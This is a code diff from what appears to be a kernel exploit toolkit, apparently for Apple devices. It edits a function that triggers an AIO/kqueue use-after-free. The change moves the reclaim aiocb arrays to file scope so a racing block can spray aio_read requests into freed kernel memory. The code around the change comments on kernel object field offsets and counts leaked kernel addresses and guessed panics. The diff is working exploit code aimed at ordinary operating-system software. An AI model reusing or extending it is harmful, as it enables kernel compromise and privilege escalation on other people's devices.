@@ -1466,6 +1466,10 @@ NSString *ModSetreuidRace(void) {
 //   +0x40 procp      struct proc*    aio_proc_lock(*(v)); 0 -> PANIC FAR=0x58
 //   +0x48 uaiocbp    user ptr        -> kev.ident
 //   +0x50 aiocb      user ptr        -> kev.udata
+// file-scope so the racer block can fill them (a block cannot capture an array)
+static struct aiocb rs_aio_rcb[8];
+static char rs_aio_rbuf[8][0x10000];
+
 NSString *ModAioKevent(void) {
     AveLog(@"[aio20637b12] === AIO kevent UAF: B1 trigger + B2 kevent read ===");
 
@@ -1490,7 +1494,6 @@ NSString *ModAioKevent(void) {
     if (kq < 0) { close(fd); return @"kqueue failed"; }
 
     static char vbuf[0x10000];
-    static char rbuf[8][0x10000];
 
     int hits = 0, silent = 0, attempts = 0, panics_guess = 0;
     uint64_t best_kva = 0;
@@ -1499,9 +1502,8 @@ NSString *ModAioKevent(void) {
     const int ROUNDS = 40;
     for (int round = 0; round < ROUNDS; round++) {
         struct aiocb cb;
-        struct aiocb rcb[8];
         memset(&cb, 0, sizeof cb);
-        memset(rcb, 0, sizeof rcb);
+        memset(rs_aio_rcb, 0, sizeof rs_aio_rcb);
 
         cb.aio_fildes = fd;
         cb.aio_offset = 0;
@@ -1523,13 +1525,13 @@ NSString *ModAioKevent(void) {
                     ssize_t r = aio_return(&cb);
                     if (r >= 0) {
                         for (int i = 0; i < NRECLAIM; i++) {
-                            memset(&rcb[i], 0, sizeof(struct aiocb));
-                            rcb[i].aio_fildes = fd;
-                            rcb[i].aio_offset = 0;
-                            rcb[i].aio_buf = rbuf[i];
-                            rcb[i].aio_nbytes = RECL_NB;
-                            rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-                            if (aio_read(&rcb[i]) == 0) issued++;
+                            memset(&rs_aio_rcb[i], 0, sizeof(struct aiocb));
+                            rs_aio_rcb[i].aio_fildes = fd;
+                            rs_aio_rcb[i].aio_offset = 0;
+                            rs_aio_rcb[i].aio_buf = rs_aio_rbuf[i];
+                            rs_aio_rcb[i].aio_nbytes = RECL_NB;
+                            rs_aio_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+                            if (aio_read(&rs_aio_rcb[i]) == 0) issued++;
                         }
                         done = 1;
                         return;
@@ -1580,8 +1582,8 @@ NSString *ModAioKevent(void) {
 
         // reap with aio_return, never aio_cancel
         for (int i = 0; i < NRECLAIM; i++) {
-            for (int s = 0; s < 50000 && aio_error(&rcb[i]) != 0; s++) {}
-            aio_return(&rcb[i]);
+            for (int s = 0; s < 50000 && aio_error(&rs_aio_rcb[i]) != 0; s++) {}
+            aio_return(&rs_aio_rcb[i]);
         }
     }
 
